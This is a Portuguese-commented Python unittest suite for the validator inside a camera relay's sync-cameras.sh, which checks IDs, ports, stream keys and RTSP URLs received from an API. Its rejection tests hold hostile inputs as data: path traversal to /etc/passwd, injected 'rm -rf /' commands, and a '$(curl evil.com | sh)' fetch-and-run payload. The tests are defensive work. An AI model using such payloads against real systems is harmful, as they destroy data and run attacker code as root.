#!/usr/bin/env python3
"""Testes do validador do `sync-cameras.sh`.

Este bloco de Python vive dentro de aspas simples num script `sh`, e é o único
lugar do relay onde um valor vindo da REDE vira:

  - nome de unidade systemd  (`replayja-rec@<id>`)
  - nome de DIRETÓRIO em disco (`/srv/rec/<id>`)
  - porta de escuta
  - conteúdo de arquivo de segredo
  - e, no caso da URL de RTSP, **texto executado como root** — porque o
    `record.sh` faz `. "$RTSP_CONF"`.

Testar isso de fora (extraindo o bloco do `.sh` e rodando de verdade) é
deliberado: testar uma cópia do código deixaria a cópia envelhecer, e o dia em
que alguém "arrumasse" o regex do script sem mexer no teste seria o dia em que
a trava sairia sem ninguém notar.

Os códigos de saída são o contrato com o shell:
    3 = JSON inválido   4 = lista vazia   5 = registro fora do formato
    7 = duas câmeras na mesma porta       0 = ok
"""
import json
import os
import re
import subprocess
import sys
import tempfile
import unittest

RAIZ = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SCRIPT = os.path.join(RAIZ, "sync-cameras.sh")

CAM = {
    "id": "rjq1a7f3c92b",
    "partnerId": "00000000-0000-0000-0000-000000000001",
    "courtId": "00000000-0000-0000-0000-000000000002",
    "enabled": True,
    "ingestKind": "rtmp_push",
    "rtmp": {"port": 19350, "streamKey": "chave-longa-aqui", "appPath": "live"},
}


def extrai_validador():
    src = open(SCRIPT, encoding="utf-8").read()
    m = re.search(r"python3 -c '\n(.*?)\n' \"\$TMP/resp\"", src, re.S)
    if not m:
        raise AssertionError(
            "nao achei o bloco `python3 -c '...'` no sync-cameras.sh — se a"
            " forma do script mudou, este teste precisa mudar junto (e nao ser"
            " apagado)"
        )
    codigo = m.group(1)
    compile(codigo, "sync-validador", "exec")  # falha cedo se o bloco quebrou
    d = tempfile.mkdtemp(prefix="sync-")
    caminho = os.path.join(d, "valida.py")
    with open(caminho, "w", encoding="utf-8") as f:
        f.write(codigo)
    return caminho


VALIDADOR = extrai_validador()


def roda(corpo):
    """Devolve (rc, {desired, rtmp, rtsp, versao})."""
    d = tempfile.mkdtemp(prefix="sync-run-")
    resp = os.path.join(d, "resp.json")
    with open(resp, "w") as f:
        json.dump(corpo, f)
    saidas = [os.path.join(d, x) for x in ("desired", "rtmp", "rtsp", "versao")]
    p = subprocess.run([sys.executable, VALIDADOR, resp] + saidas,
                       capture_output=True)
    if p.returncode != 0:
        return p.returncode, {}
    lidos = {}
    for nome, caminho in zip(("desired", "rtmp", "rtsp", "versao"), saidas):
        with open(caminho) as f:
            lidos[nome] = f.read()
    return 0, lidos


class TestAceita(unittest.TestCase):
    def test_lista_valida(self):
        rc, out = roda({"version": "v9", "cameras": [CAM]})
        self.assertEqual(rc, 0)
        self.assertEqual(out["desired"].split(), ["rjq1a7f3c92b"])
        self.assertIn("rjq1a7f3c92b 19350 chave-longa-aqui live", out["rtmp"])
        self.assertEqual(out["versao"], "v9")

    def test_camera_desligada_ganha_conf_mas_nao_gravador(self):
        # "Sem destino não há gravador": a câmera nasce na fila e só grava
        # quando ganha quadra. Mas o SEGREDO dela é materializado assim mesmo —
        # apagá-lo obrigaria a redigitar a chave na quadra.
        off = dict(CAM, id="rjq2b8f4d03c", enabled=False,
                   rtmp=dict(CAM["rtmp"], port=19351))
        rc, out = roda({"version": "v9", "cameras": [CAM, off]})
        self.assertEqual(rc, 0)
        self.assertEqual(out["desired"].split(), ["rjq1a7f3c92b"])
        self.assertIn("rjq2b8f4d03c 19351", out["rtmp"])

    def test_rtsp_pull_valida(self):
        cam = {"id": "rjq3c9g5e14d", "enabled": True, "ingestKind": "rtsp_pull",
               "rtspUrl": "rtsp://user:senha@192.168.1.9:554/Streaming/Channels/101"}
        rc, out = roda({"version": "v9", "cameras": [cam]})
        self.assertEqual(rc, 0)
        self.assertIn("rjq3c9g5e14d rtsp://", out["rtsp"])

    def test_appPath_ausente_vira_live(self):
        cam = dict(CAM, rtmp={"port": 19350, "streamKey": "chave-longa-aqui"})
        rc, out = roda({"version": "v9", "cameras": [cam]})
        self.assertEqual(rc, 0)
        self.assertTrue(out["rtmp"].strip().endswith(" live"))

    def test_version_ausente_nao_aborta(self):
        # Degradação de propósito: sem `version` perdemos só o 304, e abortar o
        # ciclo por um campo cosmético seria "falta", que custa lance.
        rc, out = roda({"cameras": [CAM]})
        self.assertEqual(rc, 0)
        self.assertEqual(out["versao"], "")


class TestAborta(unittest.TestCase):
    """Cada um destes aborta o ciclo INTEIRO sem desligar nada. Sobra é
    desperdício de disco; falta é lance perdido."""

    def test_lista_vazia(self):
        self.assertEqual(roda({"version": "v9", "cameras": []})[0], 4)

    def test_todas_desligadas(self):
        # Zero gravadores é indistinguível de uma resposta truncada.
        self.assertEqual(roda({"version": "v9", "cameras": [dict(CAM, enabled=False)]})[0], 4)

    def test_sem_o_campo_cameras(self):
        self.assertEqual(roda({"version": "v9"})[0], 3)

    def test_cameras_nao_e_lista(self):
        self.assertEqual(roda({"version": "v9", "cameras": {"id": "x"}})[0], 4)

    def test_duas_cameras_na_mesma_porta(self):
        # Duas escutas na mesma porta seria uma calada: a segunda morre com
        # "address already in use" e o gravador entra em laço.
        rc, _ = roda({"version": "v9", "cameras": [CAM, dict(CAM, id="rjq2b8f4d03c")]})
        self.assertEqual(rc, 7)

    def test_ids_invalidos(self):
        for mau in ("../../etc/passwd", "RJQ1A7F3C92B", "a/b", "ab", "x" * 40,
                    "", "rjq1-a7f3", None, 123):
            self.assertEqual(roda({"version": "v9",
                                   "cameras": [dict(CAM, id=mau)]})[0], 5, mau)

    def test_portas_invalidas(self):
        for mau in (80, 1935, 19349, 19600, 65536, -1, True, "19350", None):
            cam = dict(CAM, rtmp=dict(CAM["rtmp"], port=mau))
            self.assertEqual(roda({"version": "v9", "cameras": [cam]})[0], 5, mau)

    def test_chaves_invalidas(self):
        for mau in ("curta", "chave com espaco", "a" * 200, None, 12345,
                    "chave;rm -rf /"):
            cam = dict(CAM, rtmp=dict(CAM["rtmp"], streamKey=mau))
            self.assertEqual(roda({"version": "v9", "cameras": [cam]})[0], 5, mau)

    def test_appPath_com_barra_ou_travessia(self):
        for mau in ("live/../x", "a/b", "..", "live;x", "a" * 50):
            cam = dict(CAM, rtmp=dict(CAM["rtmp"], appPath=mau))
            self.assertEqual(roda({"version": "v9", "cameras": [cam]})[0], 5, mau)

    def test_ingest_kind_desconhecido(self):
        for mau in ("tuya_hls", "", None, "rtmp", "RTMP_PUSH"):
            self.assertEqual(roda({"version": "v9",
                                   "cameras": [dict(CAM, ingestKind=mau)]})[0], 5, mau)

    def test_camera_nao_e_objeto(self):
        self.assertEqual(roda({"version": "v9", "cameras": ["rjq1a7f3c92b"]})[0], 5)


class TestInjecaoNaURLdeRTSP(unittest.TestCase):
    """O conf de RTSP é SOURCED pelo `record.sh` como root. Uma URL com `;`,
    `$(...)`, crase, aspas ou espaço viraria COMANDO nesta máquina — e o
    atacante seria quem tivesse escrita no banco da API, não um estranho.
    Nenhuma URL fora do formato chega a virar arquivo, mesmo que a API tenha
    sido comprometida."""

    def hostil(self, url):
        cam = {"id": "rjq3c9g5e14d", "enabled": True, "ingestKind": "rtsp_pull",
               "rtspUrl": url}
        return roda({"version": "v9", "cameras": [cam]})[0]

    def test_ponto_e_virgula(self):
        self.assertEqual(self.hostil("rtsp://h/x; rm -rf /"), 5)

    def test_substituicao_de_comando(self):
        self.assertEqual(self.hostil("rtsp://h/$(curl evil.com | sh)"), 5)

    def test_crase(self):
        self.assertEqual(self.hostil("rtsp://h/`id`"), 5)

    def test_aspa_simples_fecharia_a_string_do_conf(self):
        self.assertEqual(self.hostil("rtsp://h/x'; rm -rf /; echo '"), 5)

    def test_quebra_de_linha(self):
        self.assertEqual(self.hostil("rtsp://h/x\nrm -rf /"), 5)

    def test_esquema_errado(self):
        for mau in ("http://h/x", "file:///etc/passwd", "/etc/passwd", ""):
            self.assertEqual(self.hostil(mau), 5, mau)

    def test_url_gigante(self):
        self.assertEqual(self.hostil("rtsp://h/" + "a" * 600), 5)

    def test_url_nao_e_string(self):
        self.assertEqual(self.hostil(None), 5)


if __name__ == "__main__":
    unittest.main(verbosity=2)
